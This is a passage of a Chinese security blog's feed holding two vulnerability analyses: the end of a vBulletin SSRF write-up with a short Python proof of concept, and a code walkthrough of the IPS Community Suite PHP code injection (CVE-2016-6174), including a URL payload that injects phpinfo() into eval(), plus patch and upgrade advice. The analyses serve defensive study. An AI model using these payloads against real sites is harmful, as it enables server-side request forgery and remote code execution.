class="number">0</span>; $i--)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$result = <span class="keyword">$this</span>-&gt;execCurl($url, $isHttps);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">$this</span>-&gt;vurl-&gt;bitoptions &amp; VURL_FOLLOWLOCATION) &amp;&amp; in_array(curl_getinfo(<span class="keyword">$this</span>-&gt;ch, CURLINFO_HTTP_CODE), $redirectCodes))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;closeTempFile();</span><br><span class="line">  <span class="keyword">return</span> VURL_NEXT;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>vB_vURL_cURL()</code>类中的<code>validateUrl()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span><span class="params">($urlinfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">// VBV-11823, only allow http/https schemes</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'scheme'</span>]) <span class="keyword">OR</span> !in_array(strtolower($urlinfo[<span class="string">'scheme'</span>]), <span class="keyword">array</span>(<span class="string">'http'</span>, <span class="string">'https'</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VBV-11823, do not allow localhost and 127.0.0.0/8 range by default</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($urlinfo[<span class="string">'host'</span>]) <span class="keyword">OR</span> preg_match(<span class="string">'#localhost|127\.(\d)+\.(\d)+\.(\d)+#i'</span>, $urlinfo[<span class="string">'host'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    $allowedPorts = <span class="keyword">isset</span>($config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>]) ? $config[<span class="string">'Misc'</span>][<span class="string">'uploadallowedports'</span>] : <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!is_array($allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = <span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>, $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $allowedPorts = array_merge(<span class="keyword">array</span>(<span class="number">80</span>, <span class="number">443</span>), $allowedPorts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_array($urlinfo[<span class="string">'port'</span>], $allowedPorts))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>首先看到<code>validateUrl()</code>进行了对于<code>$urlinfo</code>数组的过滤：</p><ul><li>不允许<code>127.0.0.0/8</code>这一系列的地址对本地地址或端口的操作，用于防止<code>ssrf</code>攻击</li><li>限制跳转地址访问的端口只能是<code>443</code>和<code>80</code>端口。</li></ul></li><li><p>之后，在<code>exec()</code>中，当我们设置的<code>VURL_FOLLOWLOCATION</code>值为1时，会将跳转信息为<code>301</code>与<code>302</code>的信息设置为允许二次跳转，触发<code>ssrf</code>漏洞。</p></li></ul><h1 id="0x02-漏洞利用："><a href="#0x02-漏洞利用：" class="headerlink" title="0x02 漏洞利用："></a>0x02 漏洞利用：</h1><p>测试poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">u = <span class="string">'vb服务器ip地址'</span></span><br><span class="line">redirect_server = <span class="string">'你的vps'</span></span><br><span class="line">vul_url = u + <span class="string">'/link/getlinkdata'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'url'</span> : redirect_server</span><br><span class="line">&#125;</span><br><span class="line">r = req.get(vul_url)</span><br><span class="line"><span class="keyword">print</span> vul_url</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">req.post(vul_url, data=data)</span><br></pre></td></tr></table></figure><h1 id="0x03-漏洞修复："><a href="#0x03-漏洞修复：" class="headerlink" title="0x03 漏洞修复："></a>0x03 漏洞修复：</h1><ul><li>将vBulletin升级到最新版本</li></ul><h1 id="0x05-参考："><a href="#0x05-参考：" class="headerlink" title="0x05 参考："></a>0x05 参考：</h1><p><a href="http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt" target="_blank" rel="noopener">http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞概述：&quot;&gt;&lt;a href=&quot;#0x00-漏洞概述：&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞概述：&quot;&gt;&lt;/a&gt;0x00 漏洞概述：&lt;/h1&gt;&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;p&gt;vBulletin是一个商业论坛程序，它封装了自己的curl用于发出请求。近日研究人员发现在某些版本中其getlinkdata这项功能并没有对跳转进行检测和制止，从而导致SSRF漏洞的产生。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</title>
    <link href="https://lucifaer.com/2016/08/09/IPS%20Community%20Suite%20%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%E7%9A%84PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-6174%EF%BC%89/"/>
    <id>https://lucifaer.com/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/</id>
    <published>2016-08-09T01:12:00.000Z</published>
    <updated>2018-08-09T02:22:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。</p><a id="more"></a><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h3 id="1-漏洞信息"><a href="#1-漏洞信息" class="headerlink" title="1.漏洞信息"></a>1.漏洞信息</h3><p>“IPS Community Suite “是一款国外比较常见的cms。但在其4.1.12.3版本及以下版本，存在PHP代码注入漏洞，该漏洞源于程序未能充分过滤content_class请求参数。远程攻击者可利用该漏洞注入并执行任意PHP代码。</p><h3 id="2-漏洞触发条件："><a href="#2-漏洞触发条件：" class="headerlink" title="2. 漏洞触发条件："></a>2. 漏洞触发条件：</h3><hr><p>IPS版本：&lt;=4.1.12.3</p><p>php环境：&lt;=5.4.24和5.5.0-5.5.8</p><h3 id="3-漏洞复现效果图："><a href="#3-漏洞复现效果图：" class="headerlink" title="3. 漏洞复现效果图："></a>3. 漏洞复现效果图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/phpinfo.png" alt="phpinfo.png"></p><h3 id="4-漏洞原理图："><a href="#4-漏洞原理图：" class="headerlink" title="4. 漏洞原理图："></a>4. 漏洞原理图：</h3><hr><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips.png" alt="IPS7.png"></p><h3 id="5-检测poc"><a href="#5-检测poc" class="headerlink" title="5. 检测poc"></a>5. 检测poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http:<span class="comment">//[host]/[ips]/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*`</span></span><br></pre></td></tr></table></figure><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>首先，在cms的入口<code>index.php</code>中的<code>IPS\Controller\Front::i()</code><br>在调用run方法运行程序时:</p><p><code>IPS\Controller\Front</code></p><p>会作为自动加载类先被<code>init.php</code>中的<code>autoloader()</code>方法所重定向并包含。</p><p>在该过程中会首先包含<code>IPS\Request</code>(<code>/system/Request/Request.php</code>),参数在这里被接收：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IPS\Request Object (</span><br><span class="line"> [_url:<span class="keyword">protected</span>] =&gt; IPS\Http\Url Object (</span><br><span class="line">   [url:<span class="keyword">protected</span>]</span><br><span class="line">   =&gt; http:<span class="comment">//localhost/IPS/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line">   [data] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">     [scheme] =&gt; http</span><br><span class="line">     [host] =&gt; localhost</span><br><span class="line">     [path] =&gt; /IPS/index.php</span><br><span class="line">     [query] =&gt; app=core&amp;module=system&amp;controller=content&amp;<span class="keyword">do</span>=find&amp;content_class=cms\Fields1&#123;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [queryString] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/* )</span></span><br><span class="line"><span class="comment">       [isInternal] =&gt; 1</span></span><br><span class="line"><span class="comment">       [isFriendly] =&gt;</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment">     [data:protected] =&gt; Array (</span></span><br><span class="line"><span class="comment">       [app] =&gt; core</span></span><br><span class="line"><span class="comment">       [module] =&gt; system</span></span><br><span class="line"><span class="comment">       [controller] =&gt; content</span></span><br><span class="line"><span class="comment">       [do] =&gt; find</span></span><br><span class="line"><span class="comment">       [content_class] =&gt; cms\Fields1&#123;&#125;phpinfo();/*</span></span><br><span class="line"><span class="comment">     )</span></span><br><span class="line"><span class="comment"> )</span></span><br></pre></td></tr></table></figure><p>可以明显的看到url被<code>Request</code>对象中的<code>data</code>数组以键值得形式所接收并存储。</p><p>之后会包含<code>IPS\Dispatcher\Standard</code>，在这个类中，有以下定义：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;classname = <span class="string">'IPS\\'</span> . <span class="keyword">$this</span>-&gt;application-&gt;directory . <span class="string">'\\modules\\'</span> . <span class="keyword">$this</span>-&gt;controllerLocation . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;module-&gt;key . <span class="string">'\\'</span> . <span class="keyword">$this</span>-&gt;controller;</span><br></pre></td></tr></table></figure><p>会将之前接收的参数拼接成<code>$classname</code>(<code>$classname=IPS\core\modules\front\system</code>)。</p><p>包含执行完毕后在<code>IPS\Dispatcher</code>中调用方法<code>run()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* Init class */</span></span><br><span class="line">  <span class="keyword">if</span>( !class_exists( <span class="keyword">$this</span>-&gt;classname ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_doesnt_exist'</span>, <span class="string">'2S100/1'</span>, <span class="number">404</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;classname;</span><br><span class="line">  <span class="keyword">if</span>( !( <span class="keyword">$this</span>-&gt;dispatcherController <span class="keyword">instanceof</span> \IPS\Dispatcher\Controller ) )</span><br><span class="line">  &#123;</span><br><span class="line">    \IPS\Output::i()-&gt;error( <span class="string">'page_not_found'</span>, <span class="string">'5S100/3'</span>, <span class="number">500</span>, <span class="string">''</span> );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Execute */</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;dispatcherController-&gt;execute();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">$this</span>-&gt;finish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到现在的<code>$this-&gt;dispatcherController=IPS\core\modules\front\system</code>。<br>之后判断<code>IPS\core\modules\front\system</code>是否为<code>\IPS\Dispatcher\Controller</code>的子类。</p><p>在<code>/applications/core/modules/front/system/content.php</code>找到<code>IPS\core\modules\front\system</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">IPS</span>\<span class="title">core</span>\<span class="title">modules</span>\<span class="title">front</span>\<span class="title">system</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span></span><br></pre></td></tr></table></figure><p>满足条件，之后便执行<code>execute()</code>方法。</p><p>在<code>/system/Dispatcher/Controller.php</code>中有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func( <span class="keyword">array</span>( <span class="keyword">$this</span>, \IPS\Request::i()-&gt;do ) );</span><br></pre></td></tr></table></figure><p>以上函数就是将<code>execute()</code>函数作为回调函数执行，而<code>execute()</code>函数在<code>/system/Dispatcher/Dispatcher.php</code>中的<code>i()</code>方法执行。<code>i()</code>方法将<code>Controller</code>作为一个静态类名；等同于现在将执行<code>IPS\Dispatcher\Controller</code>中的<code>find()</code>方法也就是执行<code>IPS\core\modules\front\system</code>中的<code>find()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS\\'</span> .implode(<span class="string">'\\'</span>,explode(<span class="string">'_'</span>IPS\Request::i()-&gt;content_class ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对我们传进来的<code>content_class</code>参数进行了处理，处理后的<code>$class</code>为<code>IPS\cms</code>，由于<code>class_exists()</code>函数本身的机制，导致它默认执行<code>__autoload</code>。</p><p>php在底层寻找<code>IPS\cms</code>（<code>/applications/cms/Application.php</code>），<code>$class</code>作为参数被调入其中的<code>spl_autoload_register()</code>函数。其中在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">14</span>, <span class="number">1</span> ) ) )</span><br><span class="line">&#123;</span><br><span class="line">  $databaseId = mb_substr( $class, <span class="number">14</span> );</span><br><span class="line">  <span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将我们构造的poc的前14个字符截断，与<code>IPS\cms\Fields</code>进行比较，之后判断第15个字符是否为数字或字符串，满足条件后，再将截取前14个字符串之后的值作为<code>$databaseId</code>，也就是：</p><p><code>$databaseId=1{}phpinfo();/*</code></p><p>  将其带入到<code>eval()</code>函数中，造成我们构造的php代码执行。</p><h2 id="三、官方修复分析"><a href="#三、官方修复分析" class="headerlink" title="三、官方修复分析"></a>三、官方修复分析</h2><p>经过我们的分析对比</p><p>发现 ／applications/cms/Application.php这个文件中 原来的<code>spl_autoload_register()</code>和更新后</p><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips_fix-1024x413.png" alt="ips_fix.png"></p><p>我们可以看到，官方利用<code>intval()</code>函数对最后传入的<code>$class</code>进行来整数验证</p><p>使得传入的<code>$class</code>的第14位后被限定成为一个整数，防止传入字符串进入<code>eval()</code></p><blockquote><p><strong>而升级PHP版本带来的修复是</strong></p></blockquote><p>在<code>PHP</code>的新版本<code>&gt;=5.4.25</code>或者<code>&gt;=5.5.9</code>里变更了<code>class_exists</code>的机制</p><p>而低于的版本则没有此限制可以正常触发漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS'</span> . implode( <span class="string">''</span>, explode( <span class="string">'_'</span>, IPSRequest::i()-&gt;content_class ) );</span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPSContent'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">    IPSOutput::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处</p><p><code>$class=&quot;IPS\cms\Fields1{}phpinfo();/*&quot;</code>的时候不再触发<code>class_exists()</code>去加载</p><p><code>／applications/cms/Application.php</code>中的<code>spl_autoload_register()</code>故不再触发漏洞</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><ul><li>及时升级程序版本</li><li><code>PHP</code> <code>5.4.x</code>升级至<code>5.4.25</code>以上，<code>5.5.x</code>升级至<code>5.5.9</code>以上</li><li><code>IPS</code> 升级至<code>4.12.3.1</code>以上</li></ul><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://www.seebug.org/vuldb/ssvid-92096" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92096</a></p><p><a href="https://invisionpower.com/" target="_blank" rel="noopener">https://invisionpower.com/</a></p><p><a href="http://windows.php.net/downloads/releases/archives/" target="_blank" rel="noopener">http://windows.php.net/downloads/releases/archives/</a></p><p><a href="http://karmainsecurity.com/KIS-2016-11" target="_blank" rel="noopener">http://karmainsecurity.com/KIS-2016-11</a></p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
</feed>
